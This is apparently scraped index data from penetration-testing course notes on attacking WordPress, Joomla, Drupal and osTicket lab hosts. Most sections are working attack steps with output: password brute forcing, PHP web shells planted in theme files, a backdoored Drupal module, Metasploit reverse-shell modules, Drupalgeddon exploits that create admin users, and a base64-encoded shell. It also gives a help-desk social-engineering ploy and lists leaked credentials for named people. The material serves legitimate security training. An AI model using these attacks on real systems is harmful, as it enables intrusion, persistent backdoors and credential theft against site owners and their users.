http://blog.inlanefreight.local/xmlrpc.php | Found By: Direct Access (Aggressive Detection) | Confidence: 100% | References: | - http://codex.wordpress.org/XML-RPC_Pingback_API | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner | - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access [+] WordPress readme found: http://blog.inlanefreight.local/readme.html | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] Upload directory has listing enabled: http://blog.inlanefreight.local/wp-content/uploads/ | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] WordPress version 5.8 identified (Insecure, released on 2021-07-20). | Found By: Rss Generator (Passive Detection) | - http://blog.inlanefreight.local/?feed=rss2, <generator>https://wordpress.org/?v=5.8</generator> | - http://blog.inlanefreight.local/?feed=comments-rss2, <generator>https://wordpress.org/?v=5.8</generator> | | [!] 3 vulnerabilities identified: | | [!] Title: WordPress 5.4 to 5.8 - Data Exposure via REST API | Fixed in: 5.8.1 | References: | - https://wpvulndb.com/vulnerabilities/38dd7e87-9a22-48e2-bab1-dc79448ecdfb | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-39200 | - https://wordpress.org/news/2021/09/wordpress-5-8-1-security-and-maintenance-release/ | - https://github.com/WordPress/wordpress-develop/commit/ca4765c62c65acb732b574a6761bf5fd84595706 | - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-m9hc-7v5q-x8q5 | | [!] Title: WordPress 5.4 to 5.8 - Authenticated XSS in Block Editor | Fixed in: 5.8.1 | References: | - https://wpvulndb.com/vulnerabilities/5b754676-20f5-4478-8fd3-6bc383145811 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-39201 | - https://wordpress.org/news/2021/09/wordpress-5-8-1-security-and-maintenance-release/ | - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-wh69-25hr-h94v | | [!] Title: WordPress 5.4 to 5.8 - Lodash Library Update | Fixed in: 5.8.1 | References: | - https://wpvulndb.com/vulnerabilities/5d6789db-e320-494b-81bb-e678674f4199 | - https://wordpress.org/news/2021/09/wordpress-5-8-1-security-and-maintenance-release/ | - https://github.com/lodash/lodash/wiki/Changelog | - https://github.com/WordPress/wordpress-develop/commit/fb7ecd92acef6c813c1fde6d9d24a21e02340689 [+] WordPress theme in use: transport-gravity | Location: http://blog.inlanefreight.local/wp-content/themes/transport-gravity/ | Latest Version: 1.0.1 (up to date) | Last Updated: 2020-08-02T00:00:00.000Z | Readme: http://blog.inlanefreight.local/wp-content/themes/transport-gravity/readme.txt | [!] Directory listing is enabled | Style URL: http://blog.inlanefreight.local/wp-content/themes/transport-gravity/style.css | Style Name: Transport Gravity | Style URI: https://keonthemes.com/downloads/transport-gravity/ | Description: Transport Gravity is an enhanced child theme of Business Gravity. Transport Gravity is made for tran... | Author: Keon Themes | Author URI: https://keonthemes.com/ | | Found By: Css Style In Homepage (Passive Detection) | Confirmed By: Urls In Homepage (Passive Detection) | | Version: 1.0.1 (80% confidence) | Found By: Style (Passive Detection) | - http://blog.inlanefreight.local/wp-content/themes/transport-gravity/style.css, Match: 'Version: 1.0.1' [+] Enumerating Vulnerable Plugins (via Passive Methods) [+] Checking Plugin Versions (via Passive and Aggressive Methods) [i] Plugin(s) Identified: [+] mail-masta | Location: http://blog.inlanefreight.local/wp-content/plugins/mail-masta/ | Latest Version: 1.0 (up to date) | Last Updated: 2014-09-19T07:52:00.000Z | | Found By: Urls In Homepage (Passive Detection) | | [!] 2 vulnerabilities identified: | | [!] Title: Mail Masta <= 1.0 - Unauthenticated Local File Inclusion (LFI) <SNIP> | [!] Title: Mail Masta 1.0 - Multiple SQL Injection <SNIP | Version: 1.0 (100% confidence) | Found By: Readme - Stable Tag (Aggressive Detection) | - http://blog.inlanefreight.local/wp-content/plugins/mail-masta/readme.txt | Confirmed By: Readme - ChangeLog Section (Aggressive Detection) | - http://blog.inlanefreight.local/wp-content/plugins/mail-masta/readme.txt <SNIP> [i] User(s) Identified: [+] by: admin | Found By: Author Posts - Display Name (Passive Detection) [+] admin | Found By: Rss Generator (Passive Detection) | Confirmed By: | Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Login Error Messages (Aggressive Detection) [+] john | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection) WPScan uses various passive and active methods to determine versions and vulnerabilities. The default number of threads used is 5. This value can be changed using the -t flag. Bombining both manual and automated enumeration, can be applied to almost any application we uncover. Scanners are great and are very useful but cannot replace the human touch and a curious mind. Honing our enumeration skills can set us apart from the crowd as excellent penetration testers.","title":"WPScan"},{"location":"attacking_common_apps/content_management_systems/#attacking-wordpress","text":"There are several ways we can abuse built-in functionality to attack a WordPress installation.","title":"Attacking WordPress"},{"location":"attacking_common_apps/content_management_systems/#login-bruteforce","text":"The wp-login method will attempt to brute force the standard WordPress login page, while the xmlrpc method uses WordPress API to make login attempts through /xmlrpc.php . hrmns@htb[/htb]$ sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local [+] URL: http://blog.inlanefreight.local/ [10.129.42.195] [+] Started: Wed Aug 25 11:56:23 2021 <SNIP> [+] Performing password attack on Xmlrpc against 1 user/s [SUCCESS] - john / firebird1 Trying john / bettyboop Time: 00:00:13 < > (660 / 14345052) 0.00% ETA: ??:??:?? [!] Valid Combinations Found: | Username: john, Password: firebird1 [!] No WPVulnDB API Token given, as a result vulnerability data has not been output. [!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up [+] Finished: Wed Aug 25 11:56:46 2021 [+] Requests Done: 799 [+] Cached Requests: 39 [+] Data Sent: 373.152 KB [+] Data Received: 448.799 KB [+] Memory used: 221 MB [+] Elapsed time: 00:00:23","title":"Login Bruteforce"},{"location":"attacking_common_apps/content_management_systems/#code-execution","text":"With administrative access to WordPress, we can modify the PHP source code to execute system commands. Click on Appearance on the side panel and select Theme Editor. This page will let us edit the PHP source code directly. An inactive theme can be selected to avoid corrupting the primary theme. We already know that the active theme is Transport Gravity. An alternate theme such as Twenty Nineteen can be chosen instead. Click on Select after selecting the theme, and we can edit an uncommon page such as **404.php **to add a web shell. system($_GET[0]); The code above should let us execute commands via the GET parameter 0 . We add this single line to the file just below the comments to avoid too much modification of the contents. Click on Update File at the bottom to save. We know that WordPress themes are located at /wp-content/themes/<theme name> . We can interact with the web shell via the browser or using cURL . hrmns@htb[/htb]$ curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0 = id uid=33(www-data) gid=33(www-data) groups=33(www-data) The wp_admin_shell_upload module from Metasploit can be used to upload a shell and execute it automatically. msf6 > use exploit/unix/webapp/wp_admin_shell_upload [*] No payload configured, defaulting to php/meterpreter/reverse_tcp msf6 exploit(unix/webapp/wp_admin_shell_upload) > set rhosts blog.inlanefreight.local msf6 exploit(unix/webapp/wp_admin_shell_upload) > set username john msf6 exploit(unix/webapp/wp_admin_shell_upload) > set password firebird1 msf6 exploit(unix/webapp/wp_admin_shell_upload) > set lhost 10.10.14.15 msf6 exploit(unix/webapp/wp_admin_shell_upload) > set rhost 10.129.42.195 msf6 exploit(unix/webapp/wp_admin_shell_upload) > set VHOST blog.inlanefreight.local We must specify both the vhost and the IP address, or the exploit will fail with the error Exploit aborted due to failure: not-found: The target does not appear to be using WordPress . msf6 exploit(unix/webapp/wp_admin_shell_upload) > exploit [*] Started reverse TCP handler on 10.10.14.15:4444 [*] Authenticating with WordPress using doug:jessica1... [+] Authenticated with WordPress [*] Preparing payload... [*] Uploading payload... [*] Executing the payload at /wp-content/plugins/CczIptSXlr/wCoUuUPfIO.php... [*] Sending stage (39264 bytes) to 10.129.42.195 [*] Meterpreter session 1 opened (10.10.14.15:4444 -> 10.129.42.195:42816) at 2021-09-20 19:43:46 -0400 i[+] Deleted wCoUuUPfIO.php [+] Deleted CczIptSXlr.php [+] Deleted ../CczIptSXlr meterpreter > getuid Server username: www-data (33) In the above example, the Metasploit module uploaded the wCoUuUPfIO.php file to the /wp-content/plugins directory. Many Metasploit modules (and other tools) attempt to clean up after themselves, but some fail. During an assessment, we would want to make every attempt to clean up this artifact from the client system and, regardless of whether we were able to remove it or not, we should list this artifact in our report appendices. At the very least, our report should have an appendix section that lists the following information Exploited systems (hostname/IP and method of exploitation) Compromised users (account name, method of compromise, account type (local or domain)) Artifacts created on systems Changes (such as adding a local admin user or modifying group membership)","title":"Code Execution"},{"location":"attacking_common_apps/content_management_systems/#joomla-discovery-enumeration","text":"We can often fingerprint Joomla by looking at the page source, which tells us that we are dealing with a Joomla site. hrmns@htb[/htb]$ curl -s http://dev.inlanefreight.local/ | grep Joomla <meta name=\"generator\" content=\"Joomla! - Open Source Content Management\" /> <SNIP> robots.txt file for a Joomla site will often look like this: # If the Joomla site is installed within a folder # eg www.example.com/joomla/ then the robots.txt file # MUST be moved to the site root # eg www.example.com/robots.txt # AND the joomla folder name MUST be prefixed to all of the # paths. # eg the Disallow rule for the /administrator/ folder MUST # be changed to read # Disallow: /joomla/administrator/ # # For more information about the robots.txt standard, see: # https://www.robotstxt.org/orig.html User-agent: * Disallow: /administrator/ Disallow: /bin/ Disallow: /cache/ Disallow: /cli/ Disallow: /components/ Disallow: /includes/ Disallow: /installation/ Disallow: /language/ Disallow: /layouts/ Disallow: /libraries/ Disallow: /logs/ Disallow: /modules/ Disallow: /plugins/ Disallow: /tmp/ Can fingerprint the Joomla version if the README.txt file is present. hrmns@htb[/htb]$ curl -s http://dev.inlanefreight.local/README.txt | head -n 5 1- What is this? * This is a Joomla! installation/upgrade package to version 3.x * Joomla! Official site: https://www.joomla.org * Joomla! 3.9 version history - https://docs.joomla.org/Special:MyLanguage/Joomla_3.9_version_history * Detailed changes in the Changelog: https://github.com/joomla/joomla-cms/commits/staging In certain Joomla installs, we may be able to fingerprint the version from JavaScript files in the media/system/js/ directory or by browsing to administrator/manifests/files/joomla.xml . hrmns@htb[/htb]$ curl -s http://dev.inlanefreight.local/administrator/manifests/files/joomla.xml | xmllint --format - <?xml version=\"1.0\" encoding=\"UTF-8\"?> <extension version=\"3.6\" type=\"file\" method=\"upgrade\"> <name>files_joomla</name> <author>Joomla! Project</author> <authorEmail>admin@joomla.org</authorEmail> <authorUrl>www.joomla.org</authorUrl> <copyright>(C) 2005 - 2019 Open Source Matters. All rights reserved</copyright> <license>GNU General Public License version 2 or later; see LICENSE.txt</license> <version>3.9.4</version> <creationDate>March 2019</creationDate> <SNIP> The cache.xml file can help to give us the approximate version. It is located at plugins/system/cache/cache.xml .","title":"Joomla - Discovery &amp; Enumeration"},{"location":"attacking_common_apps/content_management_systems/#enumeration_1","text":"droopescan , a plugin-based scanner that works for SilverStripe, WordPress, and Drupal with limited functionality for Joomla and Moodle. Run a scan and see what it turns up. hrmns@htb[/htb]$ droopescan scan joomla --url http://dev.inlanefreight.local/ [+] Possible version(s): 3.8.10 3.8.11 3.8.11-rc 3.8.12 3.8.12-rc 3.8.13 3.8.7 3.8.7-rc 3.8.8 3.8.8-rc 3.8.9 3.8.9-rc [+] Possible interesting urls found: Detailed version information. - http://dev.inlanefreight.local/administrator/manifests/files/joomla.xml Login page. - http://dev.inlanefreight.local/administrator/ License file. - http://dev.inlanefreight.local/LICENSE.txt Version attribute contains approx version - http://dev.inlanefreight.local/plugins/system/cache/cache.xml [+] Scan finished (0:00:01.523369 elapsed) We can also try out JoomlaScan , which is a Python tool inspired by the now-defunct OWASP joomscan tool. JoomlaScan is a bit out-of-date and requires Python2.7 to run. We can get it running by first making sure some dependencies are installed. hrmns@htb[/htb]$ sudo python2.7 -m pip install urllib3 hrmns@htb[/htb]$ sudo python2.7 -m pip install certifi hrmns@htb[/htb]$ sudo python2.7 -m pip install bs4 While a bit out of date, it can be helpful in our enumeration. hrmns@htb[/htb]$ python2.7 joomlascan.py -u http://dev.inlanefreight.local ------------------------------------------- Joomla Scan Usage: python joomlascan.py <target> Version 0.5beta - Database Entries 1233 created by Andrea Draghetti ------------------------------------------- Robots file found: > http://dev.inlanefreight.local/robots.txt No Error Log found Start scan...with 10 concurrent threads! Component found: com_actionlogs > http://dev.inlanefreight.local/index.php?option=com_actionlogs On the administrator components Component found: com_admin > http://dev.inlanefreight.local/index.php?option=com_admin On the administrator components Component found: com_ajax > http://dev.inlanefreight.local/index.php?option=com_ajax But possibly it is not active or protected LICENSE file found > http://dev.inlanefreight.local/administrator/components/com_actionlogs/actionlogs.xml LICENSE file found > http://dev.inlanefreight.local/administrator/components/com_admin/admin.xml LICENSE file found > http://dev.inlanefreight.local/administrator/components/com_ajax/ajax.xml Explorable Directory > http://dev.inlanefreight.local/components/com_actionlogs/ Explorable Directory > http://dev.inlanefreight.local/administrator/components/com_actionlogs/ Explorable Directory > http://dev.inlanefreight.local/components/com_admin/ Explorable Directory > http://dev.inlanefreight.local/administrator/components/com_admin/ Component found: com_banners > http://dev.inlanefreight.local/index.php?option=com_banners But possibly it is not active or protected Explorable Directory > http://dev.inlanefreight.local/components/com_ajax/ Explorable Directory > http://dev.inlanefreight.local/administrator/components/com_ajax/ LICENSE file found > http://dev.inlanefreight.local/administrator/components/com_banners/banners.xml <SNIP> This tool can help us find accessible directories and files and may help with fingerprinting installed extensions. Default administrator account on Joomla installs is admin, but the password is set at install time, so the only way we can hope to get into the admin back-end is if the account is set with a very weak/common password and we can get in with some guesswork or light brute-forcing. We can use this script to attempt to brute force the login. hrmns@htb[/htb]$ sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin admin:admin","title":"Enumeration"},{"location":"attacking_common_apps/content_management_systems/#attacking-joomla","text":"Using the credentials that we obtained in the examples from the last section, let's log in to the target backend at http://dev.inlanefreight.local/administrator . Once logged in, we can see many options available to us. For our purposes, we would like to add a snippet of PHP code to gain RCE. We can do this by customizing a template. From here, click on Templates on the bottom left under Configuration to pull up the templates menu. Next, we can click on a template name. Let's choose protostar under the Template column header. This will bring us to the Templates: Customise page. Click on a page to pull up the page source. It is a good idea to get in the habit of using non-standard file names and parameters for our web shells to not make them easily accessible to a \"drive-by\" attacker during the assessment. We can also password protect and even limit access down to our source IP address. Also, we must always remember to clean up web shells as soon as we are done with them but still include the file name, file hash, and location in our final report to the client. Let's choose the error.php page. We'll add a PHP one-liner to gain code execution as follows. system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']); Click on Save & Close at the top and confirm code execution using cURL . hrmns@htb[/htb]$ curl -s http://dev.inlanefreight.local/templates/protostar/error.php/error.php?dcfdd5e021a869fcc6dfaef8bf31377e = id uid=33(www-data) gid=33(www-data) groups=33(www-data) From here, we can upgrade to an interactive reverse shell and begin looking for local privilege escalation vectors or focus on lateral movement within the corporate network. Note down this change for our report appendices and make every effort to remove the PHP snippet from the error.php page.","title":"Attacking Joomla"},{"location":"attacking_common_apps/content_management_systems/#leveraging-known-vulnerabilities","text":"Researching a bit, we find that this version of Joomla is likely vulnerable to CVE-2019-10945 which is a directory traversal and authenticated file deletion vulnerability. We can use this exploit script to leverage the vulnerability and list the contents of the webroot and other directories. As pentesters, this would only be useful to us if the admin login portal is not accessible from the outside since, armed with admin creds, we can gain remote code execution, as we saw above. hrmns@htb[/htb]$ python2.7 joomla_dir_trav.py --url \"http://dev.inlanefreight.local/administrator/\" --username admin --password admin --dir / # Exploit Title: Joomla Core ( 1 .5.0 through 3 .9.4 ) - Directory Traversal && Authenticated Arbitrary File Deletion # Web Site: Haboob.sa # Email: research@haboob.sa # Versions: Joomla 1 .5.0 through Joomla 3 .9.4 # https://cve.mitre.org/cgi-bin/cvename.cgi?name = CVE-2019-10945 _ _ ____ ____ ____ ____ | | | | /\\ | _ \\ / __ \\ / __ \\| _ \\ | |__| | / \\ | |_) | | | | | | | |_) | | __ | / /\\ \\ | _ <| | | | | | | _ < | | | |/ ____ \\| |_) | |__| | |__| | |_) | |_| |_/_/ \\_\\____/ \\____/ \\____/|____/ administrator bin cache cli components images includes language layouts libraries media modules plugins templates tmp LICENSE.txt README.txt configuration.php htaccess.txt index.php robots.txt web.config.txt","title":"Leveraging Known Vulnerabilities"},{"location":"attacking_common_apps/content_management_systems/#drupal-discovery-enumeration","text":"Drupal is written in PHP and supports using MySQL or PostgreSQL for the backend. A Drupal website can be identified in several ways, including by the header or footer message Powered by Drupal , the standard Drupal logo, the presence of a CHANGELOG.txt file or README.txt file, via the page source, or clues in the robots.txt file such as references to /node . hrmns@htb[/htb]$ curl -s http://drupal.inlanefreight.local | grep Drupal <meta name=\"Generator\" content=\"Drupal 8 (https://www.drupal.org)\" /> <span>Powered by <a href=\"https://www.drupal.org\">Drupal</a></span> Another way to identify Drupal CMS is through nodes . Drupal indexes its content using nodes. A node can hold anything such as a blog post, poll, article, etc. The page URIs are usually of the form /node/<nodeid> .","title":"Drupal - Discovery &amp; Enumeration"},{"location":"attacking_common_apps/content_management_systems/#enumeration_2","text":"Newer installs of Drupal by default block access to the** CHANGELOG.txt** and README.txt files, so we may need to do further enumeration. Enumerate the version number using the CHANGELOG.txt file. Use cURL along with grep, sed, head, etc. hrmns@htb[/htb]$ curl -s http://drupal-acc.inlanefreight.local/CHANGELOG.txt | grep -m2 \"\" Drupal 7.57, 2018-02-21 Identified an older version of Drupal in use. Trying this against the latest Drupal version at the time of writing, we get a 404 response. hrmns@htb[/htb]$ curl -s http://drupal.inlanefreight.local/CHANGELOG.txt <!DOCTYPE html><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL \"http://drupal.inlanefreight.local/CHANGELOG.txt\" was not found on this server.</p></body></html> Try a scan with droopescan . Droopescan has much more functionality for Drupal than it does for Joomla. hrmns@htb[/htb]$ droopescan scan drupal -u http://drupal.inlanefreight.local [+] Plugins found: php http://drupal.inlanefreight.local/modules/php/ http://drupal.inlanefreight.local/modules/php/LICENSE.txt [+] No themes found. [+] Possible version(s): 8.9.0 8.9.1 [+] Possible interesting urls found: Default admin - http://drupal.inlanefreight.local/user/login [+] Scan finished (0:03:19.199526 elapsed) Appears to be running version 8.9.1 of Drupal. A quick search for Drupal-related vulnerabilities does not show anything apparent for this core version of Drupal. We would next want to look at installed plugins or abusing built-in functionality.","title":"Enumeration"},{"location":"attacking_common_apps/content_management_systems/#attacking-drupal","text":"Unlike some CMS', obtaining a shell on a Drupal host via the admin console is not as easy as just editing a PHP file found within a theme or uploading a malicious PHP script.","title":"Attacking Drupal"},{"location":"attacking_common_apps/content_management_systems/#leveraging-the-php-filter-module","text":"In older versions of Drupal (before version 8), it was possible to log in as an admin and enable the PHP filter module, which \"Allows embedded PHP code/snippets to be evaluated.\" Tick the check box next to the module and scroll down to Save configuration . Next, we could go to Content \u2192 Add content and create a Basic page . We can now create a page with a malicious PHP snippet such as the one below. We named the parameter with an md5 hash instead of the common cmd to get in the practice of not potentially leaving a door open to an attacker during our assessment. If we used the standard system($_GET['cmd']); we open up ourselves up to a \"drive-by\" attacker potentially coming across our web shell. Though unlikely, better safe than sorry! <?php system ( $_GET [ 'dcfdd5e021a869fcc6dfaef8bf31377e' ]); ?> Make sure to set Text format drop-down to PHP code . After clicking save, we will be redirected to the new page, in this example http://drupal-qa.inlanefreight.local/node/3 . Once saved, we can either request execute commands in the browser by appending ?dcfdd5e021a869fcc6dfaef8bf31377e=id to the end of the URL to run the id command or use cURL on the command line. From here, we could use a bash one-liner to obtain reverse shell access. hrmns@htb[/htb]$ curl -s http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e = id | grep uid | cut -f4 -d \">\" uid=33(www-data) gid=33(www-data) groups=33(www-data) From version 8 onwards, the PHP Filter module is not installed by default. To leverage this functionality, we would have to install the module ourselves. Since we would be changing and adding something to the client's Drupal instance, we may want to check with them first. hrmns@htb[/htb]$ wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz Once downloaded go to Administration > Reports > Available updates . Location may differ based on the Drupal version and may be under the Extend menu. Click on Browse , select the file from the directory we downloaded it to, and then click Install . Once installed, click on Content and create a new basic page. be sure to select PHP code from the Text format dropdown.","title":"Leveraging the PHP Filter Module"},{"location":"attacking_common_apps/content_management_systems/#uploading-a-backdoored-module","text":"Drupal allows users with appropriate permissions to upload a new module. A backdoored module can be created by adding a shell to an existing module. Modules can be found on the drupal.org website. Let's pick a module such as CAPTCHA . Scroll down and copy the link for the tar.gz archive . hrmns@htb[/htb]$ wget --no-check-certificate https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz hrmns@htb[/htb]$ tar xvf captcha-8.x-1.2.tar.gz Create PHP web shell <?php system ( $_GET [ fe8edbabc5c5c9b7b764504cd22b17af ]); ?> We need to create a .htaccess file to give ourselves access to the folder. This is necessary as Drupal denies direct access to the /modules folder. < IfModule mod_rewrite . c > RewriteEngine On RewriteBase / </ IfModule > The configuration above will apply rules for the / folder when we request a file in /modules. Copy both of these files to the captcha folder and create an archive. hrmns@htb[/htb]$ mv shell.php .htaccess captcha hrmns@htb[/htb]$ tar cvf captcha.tar.gz captcha/ captcha/ captcha/.travis.yml captcha/README.md captcha/captcha.api.php captcha/captcha.inc captcha/captcha.info.yml captcha/captcha.install <SNIP> Assuming we have administrative access to the website, click on Manage and then Extend on the sidebar. Next, click on the + Install new module button, and we will be taken to the install page, such as http://drupal.inlanefreight.local/admin/modules/install Browse to the backdoored Captcha archive and click Install . Once the installation succeeds, browse to /modules/captcha/shell.php to execute commands. hrmns@htb[/htb]$ curl -s drupal.inlanefreight.local/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af = id uid=33(www-data) gid=33(www-data) groups=33(www-data)","title":"Uploading a Backdoored Module"},{"location":"attacking_common_apps/content_management_systems/#drupalgeddon","text":"This flaw can be exploited by leveraging a pre-authentication SQL injection which can be used to upload malicious code or add an admin user. Let's try adding a new admin user with this PoC script. Once an admin user is added, we could log in and enable the PHP Filter module to achieve remote code execution. hrmns@htb[/htb]$ python2.7 drupalgeddon.py -t http://drupal-qa.inlanefreight.local -u hacker -p pwnd <SNIP> [!] VULNERABLE! [!] Administrator user created! [*] Login: hacker [*] Pass: pwnd [*] Url: http://drupal-qa.inlanefreight.local/?q=node&destination=node Let's see if we can log in as an admin. We can! Now from here, we could obtain a shell through the various means discussed previously Could also use the exploit/multi/http/drupal_drupageddon Metasploit module to exploit this.","title":"Drupalgeddon"},{"location":"attacking_common_apps/content_management_systems/#drupalgeddon2","text":"Use this PoC to confirm this vulnerability. hrmns@htb[/htb]$ python3 drupalgeddon2.py # ############################################################### # Proof-Of-Concept for CVE-2018-7600 # by Vitalii Rudnykh # Thanks by AlbinoDrought, RicterZ, FindYanot, CostelSalanders # https://github.com/a2u/CVE-2018-7600 # ############################################################### Provided only for educational or information purposes Enter target url (example: https://domain.ltd/): http://drupal-dev.inlanefreight.local/ Check: http://drupal-dev.inlanefreight.local/hello.txt Can check quickly with cURL and see that the hello.txt file was indeed uploaded. hrmns@htb[/htb]$ curl -s http://drupal-dev.inlanefreight.local/hello.txt ;-) Modify the script to gain remote code execution by uploading a malicious PHP file. <?php system ( $_GET [ fe8edbabc5c5c9b7b764504cd22b17af ]); ?> hrmns@htb[/htb]$ echo '<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>' | base64 PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K Let's replace the echo command in the exploit script with a command to write out our malicious PHP script. echo \"PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K\" | base64 -d | tee mrb3n.php Run the modified exploit script to upload our malicious PHP file. hrmns@htb[/htb]$ python3 drupalgeddon2.py # ############################################################### # Proof-Of-Concept for CVE-2018-7600 # by Vitalii Rudnykh # Thanks by AlbinoDrought, RicterZ, FindYanot, CostelSalanders # https://github.com/a2u/CVE-2018-7600 # ############################################################### Provided only for educational or information purposes Enter target url (example: https://domain.ltd/): http://drupal-dev.inlanefreight.local/ Check: http://drupal-dev.inlanefreight.local/mrb3n.php Confirm remote code execution using cURL . hrmns@htb[/htb]$ curl http://drupal-dev.inlanefreight.local/mrb3n.php?fe8edbabc5c5c9b7b764504cd22b17af = id uid=33(www-data) gid=33(www-data) groups=33(www-data)","title":"Drupalgeddon2"},{"location":"attacking_common_apps/content_management_systems/#drupalgeddon3","text":"Drupalgeddon3 is an authenticated remote code execution vulnerability that affects multiple versions of Drupal core. It requires a user to have the ability to delete a node. We can exploit this using Metasploit, but we must first log in and obtain a valid session cookie. Once we have the session cookie, we can set up the exploit module msf6 exploit(multi/http/drupal_drupageddon3) > set rhosts 10.129.42.195 msf6 exploit(multi/http/drupal_drupageddon3) > set VHOST drupal-acc.inlanefreight.local msf6 exploit(multi/http/drupal_drupageddon3) > set drupal_session SESS45ecfcb93a827c3e578eae161f280548=jaAPbanr2KhLkLJwo69t0UOkn2505tXCaEdu33ULV2Y msf6 exploit(multi/http/drupal_drupageddon3) > set DRUPAL_NODE 1 msf6 exploit(multi/http/drupal_drupageddon3) > set LHOST 10.10.14.15 msf6 exploit(multi/http/drupal_drupageddon3) > show options Module options (exploit/multi/http/drupal_drupageddon3): Name Current Setting Required Description ---- --------------- -------- ----------- DRUPAL_NODE 1 yes Exist Node Number (Page, Article, Forum topic, or a Post) DRUPAL_SESSION SESS45ecfcb93a827c3e578eae161f280548=jaAPbanr2KhLkLJwo69t0UOkn2505tXCaEdu33ULV2Y yes Authenticated Cookie Session Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS 10.129.42.195 yes The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>' RPORT 80 yes The target port (TCP) SSL false no Negotiate SSL/TLS for outgoing connections TARGETURI / yes The target URI of the Drupal installation VHOST drupal-acc.inlanefreight.local no HTTP server virtual host Payload options (php/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 10.10.14.15 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 User register form with exec If successful, we will obtain a reverse shell on the target host. msf6 exploit(multi/http/drupal_drupageddon3) > exploit [*] Started reverse TCP handler on 10.10.14.15:4444 [*] Token Form -> GH5mC4x2UeKKb2Dp6Mhk4A9082u9BU_sWtEudedxLRM [*] Token Form_build_id -> form-vjqTCj2TvVdfEiPtfbOSEF8jnyB6eEpAPOSHUR2Ebo8 [*] Sending stage (39264 bytes) to 10.129.42.195 [*] Meterpreter session 1 opened (10.10.14.15:4444 -> 10.129.42.195:44612) at 2021-08-24 12:38:07 -0400 meterpreter > getuid Server username: www-data (33) meterpreter > sysinfo Computer : app01 OS : Linux app01 5.4.0-81-generic #91-Ubuntu SMP Thu Jul 15 19:09:17 UTC 2021 x86_64 Meterpreter : php/linux","title":"Drupalgeddon3"},{"location":"attacking_common_apps/cs_config_mgmt/","text":"osTicket \u00b6 osTicket is an open-source support ticketing system. It can be compared to systems such as Jira, OTRS, Request Tracker, and Spiceworks. Footprinting/Discovery/Enumeration \u00b6 Looking back at our EyeWitness scan from earlier, we notice a screenshot of an osTicket instance which also shows that a cookie named OSTSESSID was set when visiting the page. osTicket is a web application that is highly maintained and serviced. If we look at the CVEs found over decades, we will not find many vulnerabilities and exploits that osTicket could have. This is an excellent example to show how important it is to understand how a web application works. User Input The core function of osTicket is to inform the company's employees about a problem so that a problem can be solved with the service or other components. A significant advantage we have here is that the application is open-source. Therefore, we have many tutorials and examples available to take a closer look at the application. For instance, from the osTicket documentation , we can see that only staff and users with administrator privileges can access the admin panel. So if our target company uses this or a similar application, we can cause a problem and \"play dumb\" and contact the company's staff. The simulated \"lack of\" knowledge about the services offered by the company in combination with a technical problem is a widespread social engineering approach to get more information from the company. Processing As staff or administrators, they try to reproduce significant errors to find the core of the problem. Processing is finally done internally in an isolated environment that will have very similar settings to the systems in production. Suppose staff and administrators suspect that there is an internal bug that may be affecting the business. In that case, they will go into more detail to uncover possible code errors and address more significant issues. Solution Depending on the depth of the problem, it is very likely that other staff members from the technical departments will be involved in the email correspondence. This will give us new email addresses to use against the osTicket admin panel (in the worst case) and potential usernames with which we can perform OSINT on or try to apply to other company services. Attacking osTicket \u00b6 Suppose we find an exposed service such as a company's Slack server or GitLab, which requires a valid company email address to join. Many companies have a support email such as support@inlanefreight.local , and emails sent to this are available in online support portals that may range from Zendesk to an internal custom tool. Furthermore, a support portal may assign a temporary internal email address to a new ticket so users can quickly check its status. If we come across a customer support portal during our assessment and can submit a new ticket, we may be able to obtain a valid company email address. http://support.inlanefreight.local/open.php This is a modified version of osTicket as an example, but we can see that an email address was provided. http://support.inlanefreight.local/open.php If we log in, we can see information about the ticket and ways to post a reply. If the company set up their helpdesk software to correlate ticket numbers with emails, then any email sent to the email we received when registering, 940288@inlanefreight.local , would show up here. With this setup, if we can find an external portal such as a Wiki, chat service (Slack, Mattermost, Rocket.chat), or a Git repository such as GitLab or Bitbucket, we may be able to use this email to register an account and the help desk support portal to receive a sign-up confirmation email. http://support.inlanefreight.local/open.php osTicket - Sensitive Data Exposure \u00b6 Let's say we are on an external penetration test. During our OSINT and information gathering, we discover several user credentials using the tool Dehashed . hrmns@htb[/htb]$ sudo python3 dehashed.py -q inlanefreight.local -p id : 5996447501 email : julie.clayton@inlanefreight.local username : jclayton password : JulieC8765! hashed_password : name : Julie Clayton vin : address : phone : database_name : ModBSolutions id : 7344467234 email : kevin@inlanefreight.local username : 